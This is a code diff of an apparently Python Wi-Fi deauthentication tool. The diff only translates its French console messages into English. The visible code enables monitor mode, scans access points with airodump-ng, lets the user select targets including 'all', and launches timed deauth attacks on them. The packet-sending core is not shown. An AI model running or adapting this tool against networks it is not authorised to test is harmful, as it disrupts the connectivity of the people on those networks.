@@ -36,7 +36,7 @@ def clean_scan_files():
         try:
             os.remove(file)
         except Exception as e:
-            print(f"[-] Erreur suppression {file} : {e}")
+            print(f"[-] Error deletion {file} : {e}")
 
 # === Récupérer les interfaces Wi-Fi ===
 def get_interfaces():
@@ -54,7 +54,7 @@ def enable_monitor_mode(interface):
         subprocess.run(["airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         interface = interface[:-3]
 
-    print(f"[+] Activation du mode monitor sur {interface}...")
+    print(f"[+] Enabling monitor mode on {interface}...")
     subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     # Détection automatique du nom de l'interface monitor
@@ -66,23 +66,23 @@ def enable_monitor_mode(interface):
             break
 
     if mon_iface:
-        print(f"[+] Interface monitor détectée : {mon_iface}")
+        print(f"[+] Monitor interface detected : {mon_iface}")
         return mon_iface
     else:
-        print("[-] Impossible de détecter l'interface monitor ! Utilisation de l'interface originale.")
+        print("[-] Unable to detect monitor interface! Using original interface.")
         return interface
 
 
 # === Revenir en mode normal ===
 def disable_monitor_mode(mon_iface):
     if mon_iface.endswith("mon"):
-        print(f"[+] Désactivation du mode monitor sur {mon_iface}...")
+        print(f"[+] Disabling monitor mode on {mon_iface}...")
         subprocess.run(["airmon-ng", "stop", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # === Lancer le scan airodump ===
 def run_airodump(interface):
     clean_scan_files()
-    print("[+] Scan en cours... (Ctrl+C pour arrêter)")
+    print("[+] Scanning... (Ctrl+C to stop)")
     proc = subprocess.Popen([
         "airodump-ng", "-w", SCAN_FILE_PREFIX,
         "--output-format", "csv", interface
@@ -138,7 +138,7 @@ def set_channel(interface, channel):
 
 # === Lancer l'attaque DEAUTH (broadcast + clients) ===
 def deauth_attack(ap_mac, channel, interface, duration=90, clients=None):
-    print(f"[+] Lancement de l'attaque DEAUTH sur {ap_mac} (CH {channel}) pendant {duration}s...")
+    print(f"[+] Launching DEAUTH attack on {ap_mac} (CH {channel}) for {duration}s...")
     set_channel(interface, channel)
 
     packets = []
@@ -161,7 +161,7 @@ def deauth_attack(ap_mac, channel, interface, duration=90, clients=None):
     thread = Thread(target=send_loop)
     thread.start()
     thread.join()
-    print("[+] Fin de l'attaque.")
+    print("[+] End of the attack.")
 
 # === Fonction principale ===
 def main():
@@ -169,18 +169,18 @@ def main():
         banner()
         interfaces = get_interfaces()
         if not interfaces:
-            print("[-] Aucune interface Wi-Fi détectée.")
+            print("[-] No Wi-Fi interface detected.")
             return
 
-        print("[+] Interfaces disponibles :")
+        print("[+] Available interfaces:")
         for i, iface in enumerate(interfaces):
             print(f"  {i}. {iface}")
 
         try:
-            choice = int(input("[?] Choisis l'index de l'interface : "))
+            choice = int(input("[?] Choose the interface index: "))
             iface = interfaces[choice]
         except:
-            print("[-] Choix invalide.")
+            print("[-] Invalid choice.")
             continue
 
         mon_iface = enable_monitor_mode(iface)
@@ -195,18 +195,18 @@ def main():
 
         csv_file = f"{SCAN_FILE_PREFIX}-01.csv"
         if not os.path.exists(csv_file):
-            print("[-] Aucun fichier de scan trouvé.")
+            print("[-] No scan files found.")
             disable_monitor_mode(mon_iface)
             continue
 
         aps, all_clients = parse_scan_results(csv_file)
         if not aps:
-            print("[-] Aucun point d'accès détecté.")
+            print("[-] No access point detected.")
             disable_monitor_mode(mon_iface)
             continue
 
         print_ap_list(aps)
-        selection = input("\n[+] Sélectionne une cible (ex: 1 ou 1,3 ou all) : ").strip()
+        selection = input("\n[+] Select a target (ex: 1 or 1,3 or all): ").strip()
         targets = []
         if selection.lower() == "all":
             targets = aps
@@ -223,7 +223,7 @@ def main():
             deauth_attack(ap["bssid"], ap["channel"], mon_iface, duration=60, clients=clients)
 
         disable_monitor_mode(mon_iface)
-        again = input("\n[?] Relancer un scan ? (y/n) : ").strip().lower()
+        again = input("\n[?] Restart a scan ? (y/n) : ").strip().lower()
         if again != "y":
             break
 
